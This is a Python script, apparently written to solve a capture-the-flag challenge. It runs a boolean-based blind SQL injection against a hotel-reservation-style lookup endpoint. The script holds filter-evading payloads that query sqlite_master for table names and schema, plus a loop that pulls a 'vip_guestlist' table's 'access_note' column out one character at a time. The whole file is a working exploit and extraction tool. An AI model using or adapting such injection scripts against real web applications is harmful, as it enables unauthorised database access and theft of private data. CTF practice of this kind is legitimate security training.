import requests
import time
import sys
import string

TARGET_URL = "https://823965a9-0aed-4c10-98ac-c212a981fb72.offsec.m0lecon.it/check/lookup" 

CHARS = string.ascii_letters + string.digits + string.punctuation + " "

def check_boolean_oracle(payload):
    params = {"code": payload}
    
    response = requests.get(TARGET_URL, params=params)
    
    if "No reservation found" in response.text:
        return False
        
    return True

def extract():
    extracted = ""
    position = 1

    while True:
        char_found = False
        for guess in sorted(CHARS):
            payload1 = f"(0)oR((SeLECT(SUBSTR(GROUP_CONCAT(name),{position},1))FrOM(sqlite_master)WHeRE(type)='table')='{guess}')"
            payload2 = f"(0)oR((SeLECT(SUBSTR(GROUP_CONCAT(sql),{position},1))FrOM(sqlite_master)WHeRE(name)='vip_guestlist')='{guess}')"
            payload3 = f"(0)oR((SeLECT(SUBSTR(GROUP_CONCAT(access_note),{position},1))FrOM(vip_guestlist))='{guess}')"
            
            is_correct = check_boolean_oracle(payload3)

            if is_correct:
                extracted += guess
                char_found = True
                sys.stdout.write(guess)
                sys.stdout.flush()
                break

        if not char_found:
            print(f"\n[*] Done. Result: {extracted}")
            return

        position += 1

if __name__ == "__main__":
    extract()